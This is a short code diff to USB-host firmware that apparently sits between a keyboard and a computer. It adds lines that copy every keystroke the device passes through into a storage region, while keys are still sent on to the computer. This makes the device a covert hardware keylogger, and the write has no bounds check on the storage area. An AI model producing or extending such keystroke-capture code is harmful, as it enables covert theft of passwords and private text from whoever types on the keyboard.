@@ -19,7 +19,8 @@
 #include "usbh/dev/hid.h"
 #include "chprintf.h"
 
-extern char *keyboard_storage_start;
+extern char _keyboard_storage_start;
+char *dst = &_keyboard_storage_start;
 
 static THD_WORKING_AREA(waTestHID, 1024);
 
@@ -31,6 +32,8 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
     if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
         /* send the key on the computer */
         usb_report(&UHD2, report);
+        *dst = report[2];
+        dst++;
         /* debug */
         SEGGER_RTT_printf(0, "%c", usb_to_qwerty[report[2]]);
     }
